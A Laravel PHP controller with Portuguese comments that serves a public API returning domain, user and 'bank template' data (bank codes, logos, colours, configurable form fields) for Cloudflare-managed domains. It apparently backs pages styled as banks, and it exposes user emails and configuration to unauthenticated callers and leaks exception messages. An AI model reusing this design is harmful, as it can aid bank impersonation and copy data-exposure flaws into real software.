<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\BankTemplate;
use App\Models\CloudflareDomain;
use App\Models\DnsRecord;
use App\Models\TemplateUserConfig;
use App\Models\Usuario;
use App\Models\UserConfig;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Storage;

class PublicApiController extends Controller
{
    /**
     * Retorna os dados de um domínio/subdomínio com base no identificador (nome do domínio)
     *
     * @param  string  $identifier
     * @return \Illuminate\Http\JsonResponse
     */
    public function getDomainData($identifier)
    {
        try {
            // Log da tentativa de acesso
            Log::info('API Pública - Tentativa de acesso para domínio: ' . $identifier);
            
            // Abordagem 1: Buscar pelo registro DNS
            $dnsRecord = DnsRecord::where('name', $identifier)
                               ->where('status', 'active')
                               ->first();
            
            if (!$dnsRecord) {
                // Abordagem 2: Tentar encontrar pelo domínio Cloudflare
                $cfDomain = CloudflareDomain::where('name', 'like', '%'.$identifier.'%')
                                     ->first();
                                     
                if ($cfDomain) {
                    Log::info('API Pública - Domínio Cloudflare encontrado: ' . $cfDomain->id . ' - ' . $cfDomain->name);
                    
                    // Buscar o usuário associado pelo pivot
                    $usuarios = $cfDomain->usuarios;
                    
                    if ($usuarios && $usuarios->count() > 0) {
                        $usuario = $usuarios->first();
                        
                        // Criar um response manual com dados do Cloudflare
                        $response = [
                            'status' => 'success',
                            'domain' => [
                                'name' => $cfDomain->name,
                                'type' => 'CloudflareDomain',
                                'content' => $cfDomain->name_servers ? json_encode($cfDomain->name_servers) : '',
                                'proxied' => true
                            ],
                            'user' => [
                                'id' => $usuario->id,
                                'name' => $usuario->nome,
                                'email' => $usuario->email
                            ],
                            'cloudflare' => [
                                'zone_id' => $cfDomain->zone_id,
                                'status' => $cfDomain->status,
                                'paused' => (bool)$cfDomain->paused,
                                'name_servers' => $cfDomain->name_servers
                            ]
                        ];
                        
                        // Adicionar dados da pivot
                        $pivotData = DB::table('cloudflare_domain_usuario')
                            ->where('cloudflare_domain_id', $cfDomain->id)
                            ->where('usuario_id', $usuario->id)
                            ->first();
                            
                        if ($pivotData) {
                            $configData = json_decode($pivotData->config ?? '{}', true);
                            $response['domain_config'] = [
                                'status' => $pivotData->status ?? 'active',
                                'notes' => $pivotData->notes ?? '',
                                'config' => $configData
                            ];
                        }
                        
                        // Buscar template
                        $bankTemplate = BankTemplate::where('usuario_id', $usuario->id)->first();
                        
                        if ($bankTemplate) {
                            $response['template'] = [
                                'id' => $bankTemplate->id,
                                'name' => $bankTemplate->name,
                                'bank_code' => $bankTemplate->bank_code,
                                'logo_url' => $bankTemplate->logo_url,
                                'colors' => [
                                    'primary' => $bankTemplate->primary_color,
                                    'secondary' => $bankTemplate->secondary_color,
                                    'accent' => $bankTemplate->accent_color
                                ]
                            ];
                        }
                        
                        // Buscar configurações gerais do usuário
                        $userConfig = UserConfig::where('user_id', $usuario->id)->first();
                        if ($userConfig) {
                            $response['user_config'] = [
                                'id' => $userConfig->id,
                                'config' => $userConfig->config,
                                'config_json' => $userConfig->config_json
                            ];
                        }
                        
                        return response()->json($response);
                    }
                }
                
                Log::warning('API Pública - Domínio não encontrado: ' . $identifier);
                return response()->json([
                    'status' => 'error',
                    'message' => 'Domínio não encontrado ou inativo'
                ], 404);
            }
            
            Log::info('API Pública - DNS Record encontrado: ' . $dnsRecord->id . ' - ' . $dnsRecord->name);
            
            // Verificar se o registro tem user_id preenchido
            Log::info('API Pública - ID do usuário associado ao registro DNS: ' . ($dnsRecord->user_id ?? 'NULL'));
            
            // Verificar se o domínio está associado a um usuário
            $usuario = $dnsRecord->user;
            
            if (!$usuario) {
                Log::warning('API Pública - Domínio não associado a usuário: ' . $identifier);
                return response()->json([
                    'status' => 'error',
                    'message' => 'Domínio não associado a um usuário'
                ], 404);
            }
            
            Log::info('API Pública - Usuário encontrado: ' . $usuario->id . ' - ' . $usuario->nome);
            
            // Buscar o template associado ao registro DNS ou ao usuário
            $bankTemplate = null;
            
            // Verificar se o campo bank_template_id existe no modelo Usuario
            $hasTemplateField = false;
            if (array_key_exists('bank_template_id', $usuario->getAttributes())) {
                $hasTemplateField = true;
                Log::info('API Pública - Campo bank_template_id existe no usuário, valor: ' . ($usuario->bank_template_id ?? 'NULL'));
            } else {
                Log::warning('API Pública - Campo bank_template_id não existe no modelo Usuario');
            }
            
            // Verificar se existem configurações e templates para este domínio
            $directTemplate = BankTemplate::where('usuario_id', $usuario->id)->first();
            if ($directTemplate) {
                Log::info('API Pública - Template direto encontrado para o usuário: ' . $directTemplate->id);
                $bankTemplate = $directTemplate;
            }
            
            // Buscar configurações do usuário associadas a este domínio/registro
            $userConfig = \App\Models\UserConfig::where('record_id', $dnsRecord->id)
                ->orWhere('user_id', $usuario->id)
                ->first();
            
            if ($userConfig) {
                Log::info('API Pública - Configuração do usuário encontrada: ' . $userConfig->id);
                
                // Se encontrou configuração, verificar o template associado
                if ($userConfig->template_id) {
                    Log::info('API Pública - Template ID na configuração: ' . $userConfig->template_id);
                    $bankTemplate = $userConfig->template;
                    if ($bankTemplate) {
                        Log::info('API Pública - Template carregado via configuração: ' . $bankTemplate->id);
                    } else {
                        Log::warning('API Pública - Não foi possível carregar o template a partir da configuração');
                    }
                }
            } else {
                Log::warning('API Pública - Nenhuma configuração encontrada para o usuário ou registro DNS');
            }
            
            // Caso contrário, tentar pelo bank_template_id do usuário (se existir)
            if (!$bankTemplate && $hasTemplateField && $usuario->bank_template_id) {
                Log::info('API Pública - Tentando carregar template pelo bank_template_id do usuário: ' . $usuario->bank_template_id);
                $bankTemplate = BankTemplate::find($usuario->bank_template_id);
                if ($bankTemplate) {
                    Log::info('API Pública - Template encontrado: ' . $bankTemplate->id);
                } else {
                    Log::warning('API Pública - Template não encontrado pelo ID');
                }
            }
            
            // Montar resposta com os dados necessários
            $response = [
                'status' => 'success',
                'domain' => [
                    'name' => $dnsRecord->name,
                    'type' => $dnsRecord->type,
                    'content' => $dnsRecord->content,
                    'proxied' => (bool)$dnsRecord->proxied
                ],
                'user' => [
                    'id' => $usuario->id,
                    'name' => $usuario->nome,
                    'email' => $usuario->email
                ]
            ];
            
            // Adicionar informações de template se existir
            if ($bankTemplate) {
                $response['template'] = [
                    'id' => $bankTemplate->id,
                    'name' => $bankTemplate->name,
                    'bank_code' => $bankTemplate->bank_code,
                    'logo_url' => $bankTemplate->logo_url,
                    'colors' => [
                        'primary' => $bankTemplate->primary_color,
                        'secondary' => $bankTemplate->secondary_color,
                        'accent' => $bankTemplate->accent_color
                    ]
                ];
            } else {
                // Se não houver template específico para o usuário, busque um template padrão
                // Primeiro template do sistema (geralmente ID 1 - Banco do Brasil conforme diagnóstico)
                $defaultTemplate = BankTemplate::first();
                
                if ($defaultTemplate) {
                    $response['template'] = [
                        'id' => $defaultTemplate->id,
                        'name' => $defaultTemplate->name,
                        'bank_code' => $defaultTemplate->bank_code,
                        'logo_url' => $defaultTemplate->logo_url,
                        'colors' => [
                            'primary' => $defaultTemplate->primary_color,
                            'secondary' => $defaultTemplate->secondary_color,
                            'accent' => $defaultTemplate->accent_color
                        ],
                        'is_default' => true  // Flag indicando que este é um template padrão
                    ];
                }
            }
            
            // IMPORTANTE: Aqui está a chave! As configurações personalizadas de template estão na tabela template_user_config
            // e são gerenciadas pelo ClientController quando o usuário configura o template
            
            // Inicializar variável para configurações personalizadas
            $userCustomConfig = [];
            $configSource = '';
            
            // 1. Usar o registro DNS que já foi buscado no início do método
            // (corrigido: $dns -> $dnsRecord)
            
            if ($dnsRecord && $bankTemplate) {
                Log::info('API Pública - Buscando configurações personalizadas para template ID ' . $bankTemplate->id . ' e dominio ' . $dnsRecord->id);
                
                // Buscar configurações na tabela template_user_config que contém as personalizações feitas pelo cliente
                $templateUserConfig = TemplateUserConfig::where('user_id', $usuario->id)
                    ->where('template_id', $bankTemplate->id)
                    ->where('record_id', $dnsRecord->id)
                    ->first();
                    
                if ($templateUserConfig && $templateUserConfig->config) {
                    Log::info('API Pública - Encontrou configurações PERSONALIZADAS na tabela template_user_config');
                    
                    // As configurações estão armazenadas na coluna config como array ou json
                    if (is_array($templateUserConfig->config)) {
                        // Já é array, usar diretamente
                        $userCustomConfig['campos'] = $templateUserConfig->config;
                        $configSource = 'template_user_config.array';
                    } else if (is_string($templateUserConfig->config) && !empty($templateUserConfig->config)) {
                        // É string JSON, precisa decodificar
                        $configData = json_decode($templateUserConfig->config, true);
                        if (is_array($configData)) {
                            $userCustomConfig['campos'] = $configData;
                            $configSource = 'template_user_config.json';
                        }
                    }
                    
                    if (!empty($userCustomConfig['campos'])) {
                        Log::info('API Pública - Encontrou ' . count($userCustomConfig['campos']) . ' configurações de campos do template');
                        $response['config_source'] = $configSource;
                    }
                }
            }
            
            // 2. Caso não encontre na template_user_config, buscar na tabela cloudflare_domain_usuario
            if (empty($userCustomConfig) && !empty($dnsRecord)) {
                $cfDomain = CloudflareDomain::where('name', 'like', '%' . $identifier . '%')->first();
                if ($cfDomain) {
                    $pivotData = DB::table('cloudflare_domain_usuario')
                        ->where('cloudflare_domain_id', $cfDomain->id)
                        ->where('usuario_id', $usuario->id)
                        ->first();
                        
                    if ($pivotData && isset($pivotData->config) && !empty($pivotData->config)) {
                        Log::info('API Pública - Encontrou configurações na tabela pivot cloudflare_domain_usuario');
                        $pivotConfig = json_decode($pivotData->config, true);
                        if (is_array($pivotConfig)) {
                            $userCustomConfig = $pivotConfig;
                            $response['config_source'] = 'cloudflare_domain_usuario';
                        }
                    }
                }
            }
            
            // 3. Por último, verificar na tabela user_configs
            if (empty($userCustomConfig) && $userConfig) {
                if ($userConfig->config_json && !empty($userConfig->config_json)) {
                    $userConfigData = json_decode($userConfig->config_json, true);
                    if (is_array($userConfigData) && !empty($userConfigData)) {
                        Log::info('API Pública - Encontrou configurações na tabela user_configs.config_json');
                        $userCustomConfig = $userConfigData;
                        $response['config_source'] = 'user_configs.config_json';
                    }
                } else if (is_array($userConfig->config) && !empty($userConfig->config)) {
                    Log::info('API Pública - Encontrou configurações na tabela user_configs.config');
                    $userCustomConfig = $userConfig->config;
                    $response['config_source'] = 'user_configs.config';
                }
            }
            
            // IMPORTANTE: Vamos buscar as configurações de campos personalizados da tabela template_user_configs
            // conforme solicitado pelo usuário
            if ($bankTemplate) {
                Log::info('API Pública - Processando template bancário id=' . $bankTemplate->id);
                
                // Dados básicos do template
                $templateData = [
                    'id' => $bankTemplate->id,
                    'name' => $bankTemplate->name,
                    'bank_code' => $bankTemplate->bank_code,
                    'description' => $bankTemplate->description,
                ];
                
                // 1. Primeiro buscamos a configuração personalizada na tabela template_user_configs
                // que contém as configurações de quais campos estão ativos e sua ordem
                $templateUserConfig = DB::table('template_user_configs')
                    ->where('user_id', $usuario->id)
                    ->where('template_id', $bankTemplate->id)
                    ->where('record_id', $dnsRecord->id)
                    ->first();
                
                Log::info('API Pública - Buscando template_user_configs para: user_id=' . $usuario->id . 
                        ', template_id=' . $bankTemplate->id . ', record_id=' . $dnsRecord->id);
                
                // Inicializar arrays
                $camposConfig = [];
                $camposOrder = [];
                
                // Verificar se estamos usando a tabela correta (template_user_configs)
                // Debug para verificar se a tabela existe
                try {
                    $checkTable = DB::select("SHOW TABLES LIKE 'template_user_configs'");
                    Log::info('API Pública - Verificando tabela: ' . json_encode($checkTable));
                } catch (\Exception $e) {
                    Log::error('API Pública - Erro ao verificar tabela: ' . $e->getMessage());
                }
                
                // Exibir todos os registros da tabela para debug
                try {
                    $allConfigs = DB::table('template_user_configs')->get();
                    Log::info('API Pública - Total de registros na tabela: ' . $allConfigs->count());
                    foreach($allConfigs as $config) {
                        Log::info("API Pública - Config ID {$config->id}: user_id={$config->user_id}, template_id={$config->template_id}, record_id={$config->record_id}");
                    }
                } catch (\Exception $e) {
                    Log::error('API Pública - Erro ao listar registros: ' . $e->getMessage());
                }
                
                // Agora buscar a configuração específica deste usuário
                $templateUserConfig = DB::table('template_user_configs')
                    ->where('user_id', $usuario->id)
                    ->where('template_id', $bankTemplate->id);
                    
                // Adicionamos a condição de record_id apenas se tivermos um dnsRecord
                if ($dnsRecord) {
                    $templateUserConfig->where('record_id', $dnsRecord->id);
                }
                
                $templateUserConfig = $templateUserConfig->first();
                
                Log::info('API Pública - Buscando config em template_user_configs: user_id=' . $usuario->id . 
                        ', template_id=' . $bankTemplate->id . 
                        ($dnsRecord ? ', record_id=' . $dnsRecord->id : ', sem record_id'));
                
                if ($templateUserConfig && !empty($templateUserConfig->config)) {
                    Log::info('API Pública - Config encontrada: ' . $templateUserConfig->config);
                    
                    // A configuração do usuário existe, vamos decodificar o JSON
                    $userConfigData = json_decode($templateUserConfig->config, true);
                    
                    if (json_last_error() !== JSON_ERROR_NONE) {
                        Log::error('API Pública - Erro ao decodificar JSON: ' . json_last_error_msg());
                    } else {
                        Log::info('API Pública - Configuração decodificada: ' . json_encode($userConfigData));
                        
                        // Processar cada campo da configuração do usuário
                        foreach ($userConfigData as $fieldKey => $fieldConfig) {
                            // Preparar estrutura básica para cada campo
                            $camposConfig[$fieldKey] = [
                                'name' => ucfirst($fieldKey),  // Nome capitalizado da chave
                                'key' => $fieldKey,
                                'type' => 'text',              // Tipo padrão
                                'visible' => $fieldConfig['active'] ?? true,
                                'order' => $fieldConfig['order'] ?? 999
                            ];
                            
                            // Se o campo está ativo, adicionar à ordem
                            if (isset($fieldConfig['active']) && $fieldConfig['active'] === true) {
                                $camposOrder[] = $fieldKey;
                            }
                        }
                    }
                } else {
                    Log::warning('API Pública - Nenhuma configuração encontrada na tabela template_user_configs');
                }
                
                Log::info('API Pública - Total de campos finais com configurações combinadas: ' . count($camposConfig));
                
                // Aplicar configurações personalizadas do usuário se existirem
                if ($userCustomConfig && isset($userCustomConfig['campos']) && is_array($userCustomConfig['campos'])) {
                    Log::info('API Pública - Aplicando configurações personalizadas aos campos do template');
                    
                    // Aplicar configurações personalizadas para cada campo
                    foreach ($userCustomConfig['campos'] as $campoKey => $campoConfig) {
                        if (isset($camposConfig[$campoKey])) {
                            // Mesclar configurações personalizadas com as do campo
                            $camposConfig[$campoKey] = array_merge($camposConfig[$campoKey], $campoConfig);
                        } else if (is_array($campoConfig)) {
                            // Se é um novo campo personalizado, adicionar diretamente
                            $camposConfig[$campoKey] = $campoConfig;
                            // Adicionar à lista de ordem se ainda não estiver lá
                            if (!in_array($campoKey, $camposOrder)) {
                                $camposOrder[] = $campoKey;
                            }
                        }
                    }
                    
                    // Se o usuário definiu uma ordem específica para os campos, usar ela
                    if (isset($userCustomConfig['order']) && is_array($userCustomConfig['order'])) {
                        $camposOrder = $userCustomConfig['order'];
                    }
                }
                
                // Montar resposta final
                $response['fields'] = [
                    'template_id' => $bankTemplate->id,
                    'campos' => $camposConfig,
                    'order' => $camposOrder,
                    'total' => count($camposConfig)
                ];
                
                // Adicionar dados do template
                $response['template'] = $templateData;
                
                // Se tem estilo personalizado, adicionar
                if ($userCustomConfig && isset($userCustomConfig['style'])) {
                    $response['fields']['style'] = $userCustomConfig['style'];
                }
            } else {
                // Se não há template, apenas retornar estrutura vazia para campos
                Log::info('API Pública - Nenhum template encontrado, retornando estrutura vazia');
                $response['fields'] = [
                    'campos' => [],
                    'order' => [],
                    'total' => 0
                ];
            }
            
            // 6. Adicionar a configuração original do usuário para fins de debug/desenvolvimento
            if ($userCustomConfig) {
                $response['user_custom_config'] = $userCustomConfig;
            }
            
            // Verificar se o domínio também está na tabela CloudflareDomain para buscar configs adicionais
            $cfDomain = CloudflareDomain::where('name', 'like', '%'.$identifier.'%')->first();
            if ($cfDomain) {
                $pivotData = DB::table('cloudflare_domain_usuario')
                    ->where('cloudflare_domain_id', $cfDomain->id)
                    ->where('usuario_id', $usuario->id)
                    ->first();
                    
                if ($pivotData) {
                    $configData = json_decode($pivotData->config ?? '{}', true);
                    $response['domain_config'] = [
                        'status' => $pivotData->status ?? 'active',
                        'notes' => $pivotData->notes ?? '',
                        'config' => $configData
                    ];
                }
            }
            
            return response()->json($response);
            
        } catch (\Exception $e) {
            Log::error('Erro na API pública: ' . $e->getMessage());
            Log::error('Stack trace: ' . $e->getTraceAsString());
            
            return response()->json([
                'status' => 'error',
                'message' => 'Erro ao processar a solicitação: ' . $e->getMessage()
            ], 500);
        }
    }
}
